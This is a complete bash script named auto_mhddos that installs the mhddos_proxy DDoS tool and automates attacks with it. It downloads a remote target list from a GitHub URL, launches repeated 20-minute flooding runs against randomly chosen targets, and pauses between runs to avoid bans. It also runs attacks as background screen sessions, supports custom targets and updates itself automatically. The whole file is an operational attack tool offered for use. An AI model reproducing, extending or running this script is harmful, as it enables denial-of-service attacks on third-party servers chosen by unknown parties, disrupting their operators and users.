#!/bin/bash

# exit on error
set -e

# settings
my_name=auto_mhddos
my_exe=/usr/local/bin/$my_name
my_dir=/opt/$my_name
my_log=/var/log/$my_name
my_path=$(readlink -f "$0")

auto_repo='https://github.com/girador/auto.git'
auto_dir=$my_dir/auto
mhddos_repo='https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
mhddos_dir=$my_dir/mhddos

my_ulimit=1048576
attack_timeout=20m
targets='https://raw.githubusercontent.com/girador/res/main/targets.txt'

# kill child processes on ctrl+c
trap 'kill $(jobs -p) 2>/dev/null' INT

# functions

print_log() { echo "$(date +"%Y-%m-%d %T") | $*"; }
print_red() { echo -e "\e[7;31m$(print_log "$@")\e[0m"; }
print_green() { echo -e "\e[7;32m$(print_log "$@")\e[0m"; }
print_blue() { echo -e "\e[7;36m$(print_log "$@")\e[0m"; }

self_help() {

	echo '
mhddos_proxy attacks automation
With intervals, timeouts, random targets, target autoupdate and ability to run custom mhddos_proxy attack
'"$my_name"' ACTION:
	-h | --help | h | help
		show this help meesage
	i | install | u | update
		installs/reinstalls/updates '"$my_name"' and its dependencies
		'"$my_name"' becomes available as command in shell
	r | run OPTIONS...
		Run attack with random target in foreground, OPTIONS after r | run will be passed to mhddos_proxy as is
		Full list of mhddos_proxy options: https://github.com/porthole-ascend-cinnamon/mhddos_proxy#cli
		Examples:
			Run attack on random targets with default OPTIONS:
				'"$my_name"' run
			Run attack on random targets with custom OPTIONS passed to mhddos_proxy:
				'"$my_name"' run --threads 2000 --rpc 1000 --debug
		You can also run your custom targets, for instance:
			'"$my_name"' run mhddos https://YOURTARGETS... OPTIONS...
	sta | start OPTIONS...
		The same as r | run, but starts the attack in screen session as a service/daemon
		The name of screen session will be: PID.'"$my_name"'.DATE_TIME_COMMAND
		Recommended parameters to start with:
			'"$my_name"' start --threads 2000 --rpc 1000 --debug
		Custom targets, for instance from dedicated channels
		CUSTOMTARGETSANDOPTIONS would be everything after "python3 runner.py":
			'"$my_name"' start mhddos CUSTOMTARGETSANDOPTIONS...
	s | show ATTACK
		Show ATTACK progress, basically shows the attack log in real time
		A part of attack name can be provided
			So to view attack 9936.auto_mhddos.22-04-06_11:55:35_threads_2000_rpc_1000_debug,
			you can just type: '"$my_name"' show 9936
		If no ATTACK provided, shows the list of running attacks initiated by '"$my_name"'
	sto | stop ATTACK
		Stops ATTACK
		If no ATTACK provided, stops all found running attacks initiated by '"$my_name"'
	rm | remove
		Removes '"$my_name"' components, found running attacks and logs
	'
	return

}

main() {

	arg="$1"
	shift || true
	case "$arg" in
	-h | --help | h | help)
		self_help
		;;
	i | install | u | update)
		self_install "$@"
		;;
	r | run)
		self_run "$@"
		;;
	sta | start)
		self_start "$@"
		;;
	s | show | '')
		self_show "$@"
		;;
	sto | stop)
		self_stop "$@"
		;;
	rm | remove)
		self_remove "$@"
		;;
	*)
		print_red "No such option: '$arg'" >&2
		return 1
		;;
	esac

}

self_install() {

	print_blue "Installing $my_name"
	apt update -y
	apt install -y \
		gcc libc-dev libffi-dev libssl-dev python3-dev rustc \
		screen \
		git \
		python3 python3-pip
	pip3 install --upgrade pip

	mkdir -p "$my_dir"
	chmod 700 "$my_dir"

	rm -rfv "$auto_dir"
	git clone --depth 1 "$auto_repo" "$auto_dir"
	if [ -f "$auto_dir"/"$my_name" ]; then
		ln -sf "$auto_dir"/"$my_name" "$my_exe"
	else
		install -m 0700 "$my_path" "$my_exe"
	fi

	rm -rfv "$mhddos_dir"
	git clone --depth 1 "$mhddos_repo" "$mhddos_dir"
	pip3 install -r "$mhddos_dir"/requirements.txt

	apt autoremove -y

	print_green "$my_name installed"
	self_help

}

self_run() {

	ulimit -n "$my_ulimit"

	while true; do

		print_blue "Updating the repos..."
		mhddos_pull=$(git -C "$mhddos_dir" pull origin main)
		grep -q "Already.*up.*to.*date" <<<"$mhddos_pull" || {
			print_blue "mhddos repo updated, updating the requirements..."
			pip3 install -r "$mhddos_dir"/requirements.txt
			print_green "mhddos requirements updated"
		}
		auto_pull=$(git -C "$auto_dir" pull origin main)
		grep -q "Already.*up.*to.*date" <<<"$auto_pull" || {
			print_blue "$my_name repo updated, restarting the task with the new version of script..."
			"$my_path" run "$@"
			return
		}

		if [ "$1" == "mhddos" ]; then
			shift
			print_blue "mhddos_proxy with custom targets and options: $@"
			python3 "$mhddos_dir"/runner.py "$@" &
			attack_pid=$!
		else
			print_blue "Parsing targets from $targets"
			target_list=$(curl -s "$targets" | grep "^[^#]")

			target_quantity=$(wc -l <<<"$target_list")
			print_blue "Number of targets in list: $target_quantity"

			target_random=$(shuf -i 1-"$target_quantity" -n 1)
			target_cmd=$(sed "$target_random"'q;d' <<<"$target_list")
			print_blue "Random target: $target_random: $target_cmd"

			python3 "$mhddos_dir"/runner.py $target_cmd "$@" &
			attack_pid=$!
		fi
		print_green "Running attack for $attack_timeout: PID $attack_pid"
		sleep "$attack_timeout"
		print_blue "$attack_timeout of attack elapsed"
		kill -- -"$attack_pid" 2>/dev/null || kill "$attack_pid" || true
		print_green "Attack stopped: PID $attack_pid"

		attack_sleep=$(shuf -i 2-6 -n 1)m
		print_blue "Sleeping $attack_sleep without attack to protect your machine from ban..."
		sleep "$attack_sleep"
		print_blue "Restarting..."

	done

}

self_start() {

	attack_name="$(date +"%y-%m-%d_%T")"_"$(tr " " "_" <<<"$*" | tr -dc _A-Za-z0-9 | head -c30)"
	mkdir -p "$my_log"
	chmod 0700 "$my_log"
	echo ''"$my_log"'/*.log
{
	rotate 7
	daily
	missingok
	notifempty
	delaycompress
	compress
}' >/etc/logrotate.d/"$my_name"
	attack_log="$my_log"/"$attack_name".log
	print_blue "Starting attack $attack_name"
	screen -dmS "$my_name"."$attack_name" -L -Logfile "$attack_log" "$my_path" run "$@"
	print_green "Attack $attack_name started"
	print_blue "watch: $my_name show $attack_name"
	print_blue "stop:  $my_name stop $attack_name"

}

self_show() {

	if attack_list=$(screen -ls | awk '{print $1}' | grep "\.${my_name}\."); then
		if [ $# = 0 ]; then
			echo "$attack_list"
		else
			if attack_name=$(self_show | grep -m1 "$1"); then
				attack_log="$my_log"/"$(cut -d. -f3 <<<"$attack_name")".log
				print_blue "Showing attack $attack_name from $attack_log, ctrl+c to to stop watching"
				tail -f "$attack_log"
			else
				print_red "Attack '$1' not found" >&2
				return 1
			fi
		fi
	else
		print_red "No attacks running" >&2
		return 1
	fi

}

self_stop() {

	if [ $# = 0 ]; then
		set -- $(self_show)
	fi
	for attack; do
		if attack_name=$(self_show | grep -m1 "$attack"); then
			print_blue "Stopping attack $attack_name"
			attack_pid=$(cut -d. -f1 <<<"$attack_name")
			kill -- -"$attack_pid"
			print_green "Attack with PID $attack_pid stopped"
		else
			print_red "Attack $attack not found" >&2
			return 1
		fi
	done

}

self_remove() {

	print_blue "Removing $my_name"
	self_stop || true
	rm -rfv "$my_exe" "$my_dir" "$my_log" /etc/logrotate.d/"$my_name"
	print_green "$my_name removed"

}

main "$@"
